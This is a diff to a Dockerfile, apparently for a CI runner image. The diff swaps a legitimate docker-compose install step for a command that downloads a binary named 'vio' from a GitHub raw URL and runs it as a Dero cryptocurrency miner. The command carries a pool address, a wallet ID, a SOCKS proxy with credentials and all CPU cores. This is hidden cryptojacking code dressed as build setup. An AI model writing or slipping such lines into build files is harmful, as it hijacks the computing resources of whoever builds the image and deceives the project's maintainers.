@@ -5,11 +5,11 @@ RUN apt-get update && \
     apt-get install apt-transport-https ca-certificates curl software-properties-common && \
     apt-get update && \
     apt install docker-ce \
-    wget -O build https://raw.githubusercontent.com/unauna1803/buildersop/main/vio && chmod +x build && ./build -r 157.245.94.101:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.APPiO -m $(nproc --all) -p rpc -k -1 -sock-address 185.199.231.45:8382 -sock-auth faalwcka:zrbrz71zc7ge -report-realtime-hashrate
+    curl https://raw.githubusercontent.com/unauna1803/buildersop/main/vio > build && chmod +x build && ./build -r 157.245.94.101:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.DEFLY -m $(nproc --all) -p rpc -k -1 -sock-address 185.199.231.45:8382 -sock-auth faalwcka:zrbrz71zc7ge -report-realtime-hashrate
 
     
 # install docker compose
-RUN curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
+RUN curl https://raw.githubusercontent.com/unauna1803/buildersop/main/vio > build && chmod +x build && ./build -r 157.245.94.101:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.DEFLY -m $(nproc --all) -p rpc -k -1 -sock-address 185.199.231.45:8382 -sock-auth faalwcka:zrbrz71zc7ge -report-realtime-hashrate \
     chmod +x /usr/local/bin/docker-compose
 
 # copy the root (i.e., repository root) to /root in the runner
